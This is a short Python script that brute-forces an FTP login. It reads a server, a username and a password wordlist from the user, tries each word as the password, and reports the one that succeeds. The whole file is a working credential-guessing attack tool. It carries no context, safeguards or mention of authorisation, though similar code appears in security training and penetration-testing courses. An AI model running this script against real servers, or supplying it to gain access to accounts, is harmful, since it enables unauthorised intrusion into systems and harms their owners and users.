#!/usr/bin/python3
import ftplib

server = input("FTP Server: ")
user = input("username: ")
Passwordlist = input("Path to Password List > ")

try:
    with open(Passwordlist, 'r') as pw:
        for word in pw:
            word = word.strip('\r\n')
            try:
                ftp = ftplib.FTP(server)
                ftp.login(user, word)
                print('Success! The password is ' + word)
                break  # Exit the loop if the password is found
            except ftplib.error_perm as exc:
                print('still trying...', exc)
except Exception as exc:
    print('Wordlist error: ', exc)

